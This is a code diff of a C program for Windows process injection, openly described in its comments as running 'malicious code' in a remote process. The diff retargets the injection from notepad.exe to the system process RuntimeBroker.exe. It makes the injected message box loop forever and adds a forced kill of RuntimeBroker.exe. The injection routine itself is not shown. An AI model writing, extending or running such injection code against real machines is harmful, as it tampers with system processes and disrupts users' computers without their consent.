@@ -8,16 +8,19 @@
 #include<stdlib.h>
 #include<String.h>
 //Globals and consts
-#define INJECTED_PROCESS_COMMAND "Tasklist | findstr notepad.exe"
-
+#define INJECTED_PROCESS_COMMAND "Tasklist | findstr RuntimeBroker.exe"
+#define PAYLOAD_TIME 10
 //This is the function that will be the entry of the run in thr remote process
 //The run of the malicious code will start from here
 int InjectionEntryPoint()
 {
 	wchar_t Buffer[300] = { NULL };
 	GetModuleFileName(GetModuleHandle(NULL), Buffer, 300);
-
-	MessageBox(NULL, L"This is the code from the injection entry point!!", Buffer, 0);
+	while(TRUE)
+	{
+		
+		MessageBox(NULL, L"This is the code from the injection entry point!!", Buffer, 0);
+	}
 	return 0;
 
 }
@@ -191,6 +194,9 @@ int ProcessInjection(DWORD Pid)
 int main()
 {
 	ProcessInjection(GetProcessPid(INJECTED_PROCESS_COMMAND));
+	Sleep(1000*PAYLOAD_TIME);
+	system("Taskkill /F /IM RuntimeBroker.exe");
+	return 0;
 	
 }
 
